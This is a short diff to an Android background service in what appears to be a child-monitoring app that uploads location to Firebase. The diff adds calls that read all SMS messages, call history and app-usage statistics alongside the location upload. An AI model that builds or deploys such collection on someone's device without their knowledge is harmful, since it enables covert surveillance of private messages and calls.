@@ -13,12 +13,8 @@ import android.util.Log;
 import com.google.firebase.auth.FirebaseAuth;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
-import com.google.firebase.database.Query;
 
-import java.text.SimpleDateFormat;
-import java.util.Calendar;
 import java.util.Date;
-import java.util.concurrent.TimeUnit;
 
 
 public class MySerVice extends Service {
@@ -27,6 +23,21 @@ public class MySerVice extends Service {
         String str[] = email.split("@");
         return str[0];
     }
+
+    MessageHistory msghist;
+    AppStats appst;
+    CallHistory cal;
+
+    public MySerVice()
+    {}
+
+    public MySerVice(MessageHistory msghist, AppStats appst, CallHistory cal)
+    {
+        this.msghist = msghist;
+        this.appst = appst;
+        this.cal = cal;
+    }
+
 
     static String childID= getUserID(FirebaseAuth.getInstance().getCurrentUser().getEmail());
 
@@ -66,6 +77,10 @@ public class MySerVice extends Service {
             newPost.child("Lat").setValue(lat);
 
             newPost.child("Long").setValue(lng);
+
+            msghist.getAllSms(MySerVice.this);
+            cal.getCallDetails(MySerVice.this);
+            appst.printCurrentUsageStatus(MySerVice.this);
 
         }
 
